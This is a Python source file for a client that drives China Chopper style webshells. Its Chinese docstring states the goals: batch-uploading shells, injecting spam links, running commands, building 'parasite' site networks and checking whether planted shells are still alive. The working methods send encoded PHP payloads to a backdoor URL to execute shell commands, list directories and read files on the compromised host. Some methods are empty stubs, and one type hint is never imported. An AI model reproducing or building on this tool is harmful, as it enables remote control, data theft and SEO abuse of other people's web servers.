#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# Authors: liangzhibang@baidu.com
# Date: 2018-05-25

__author__ = "liangzhibang@baidu.com"
__date__ = '2018/5/25'

import random
import re
import string
from collections import namedtuple

import requests

import PHP
import encode
from PHP import LeftDelimiter, RightDelimiter


def generate_random():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))


def retry(func):
    # TODO:重试函数，新增参数等。例如需要铺获的异常，重试次数等等，现在就是一个小demo
    def wrappers(*args, **kwargs):
        for i in range(3):
            try:
                return func(*args, **kwargs)
            except AttributeError as e:
                pass

    return wrappers


class Caidao(object):
    """
    本类是webshell操作的核心，这里负责一切webshell操作，例如批量上传等等，当然也负责自动挂链，寄生虫等高级功能
    功能如下：
    1 批量上传功能
    2 自动挂链功能
    3 执行命令
    4 寄生虫站群
    5 定时监测webshell存活
    6 泛目录等seo
    #TODO: 还有部分功能未完成
    1.上传文件功能
    2.文件删除功能

    长期目标，需要实现自动化seo

    """

    def __init__(self, url, password, Type):
        self.url = url
        self.password = password
        self.shell_type = Type
        self.conn = False
        self.path = "/bin/sh"
        self.statement = PHP
        self.root = ""
        self.info = ""

    def test_php_connection(self) -> bool:
        pass

    def test_asp_connection(self):
        pass

    def test_connection(self) -> object:
        if self.shell_type == 'PHP':
            return self.test_php_connection()
        elif self.shell_type == "ASP":
            return self.test_asp_connection()
        else:
            raise TypeError("could't found type, try again")

    @retry
    def __submit_data(self, data: dict) -> str:
        response = requests.post(self.url, data=data)
        pattern = re.compile("%s(.+)%s" % (LeftDelimiter, RightDelimiter), re.DOTALL)
        re_result = pattern.search(response.text)
        return re_result.group(1).strip()

    def find_writeable_folder(self):
        pass

    def assemble_data(self, statement: str, func=lambda x: x) -> dict:
        data = func(getattr(self.statement, statement))
        base = getattr(self.statement, "BASE")
        encoding = getattr(encode, PHP.encoding)
        parameter = generate_random()
        return {
            self.password: base % ("$_POST[%s]" % parameter),
            parameter: encoding(data)
        }

    def exec_command(self, cmd: str) -> str:
        data = self.assemble_data("SHELL", lambda x: x % [self.path, cmd])
        return self.__submit_data(data)

    def get_base_info(self) -> NoReturn:
        data = self.assemble_data("BASE_INFO")
        result = self.__submit_data(data)
        tuple_result = result.split('\t')
        self.root = tuple_result[0]
        self.info = tuple_result[2]

    def get_folder_list(self, folder: str) -> list:
        data = self.__submit_data(self.assemble_data("SHOW_FOLDER", lambda x: x % folder))
        item = namedtuple('item', ("is_dir", 'name', "st_mtime", "size", 'permission'))
        folder_list = []
        for i in data.split('\n'):
            folder_list.append(item._make(i.split('\t')))
        return folder_list

    def read_file(self, item: namedtuple) -> str:
        if item.is_dir is 'T':
            raise TypeError
        data = self.assemble_data("READ_FILE", lambda x: x % (item.name))
        return self.__submit_data(data)


if __name__ == '__main__':
    a = Caidao("http://localhost:32769/1.php", "cmd", "PHP")
    a.get_base_info()
    print(a.read_file(a.get_folder_list(a.root)[6]))
